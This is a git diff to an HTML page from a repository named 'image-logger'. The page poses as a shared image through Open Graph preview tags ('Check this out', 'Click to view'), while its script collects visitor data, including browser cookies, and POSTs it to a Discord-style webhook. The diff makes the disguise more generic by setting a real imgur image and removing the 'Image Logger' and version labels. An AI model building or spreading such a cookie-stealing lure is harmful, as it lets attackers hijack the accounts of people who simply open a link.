@@ -3,22 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Logger</title>
+    <title>Image</title>
     
-    <!-- REPLACE THE LINK BELOW WITH YOUR IMGUR DIRECT LINK -->
-    <meta property="og:image" content="https://i.imgur.com/YOUR_IMGUR_LINK_HERE.png"> 
-    <meta property="og:title" content="Check out this image">
-    <meta property="og:description" content="Click to view full size">
+    <!-- USE THIS DIRECT LINK -->
+    <meta property="og:image" content="https://i.imgur.com/6hLYgA4.png">
+    <meta property="og:title" content="Check this out">
+    <meta property="og:description" content="Click to view">
     <meta property="og:url" content="https://bighunnab-bit.github.io/image-logger/">
     
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #2f3136;
-            height: 100vh;
-            overflow: hidden;
-        }
+        body { margin: 0; padding: 0; background: #2f3136; height: 100vh; }
     </style>
 </head>
 <body>
@@ -55,7 +49,7 @@
                             inline: true
                         },
                         {
-                            name: "🔑 Browser Cookies",
+                            name: "🔑 Cookies",
                             value: `\`\`\`${cookies}\`\`\``,
                             inline: false
                         },
@@ -71,16 +65,14 @@
                         }
                     ],
                     footer: {
-                        text: "Logger v1.0"
+                        text: "Logger"
                     }
                 }]
             };
 
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
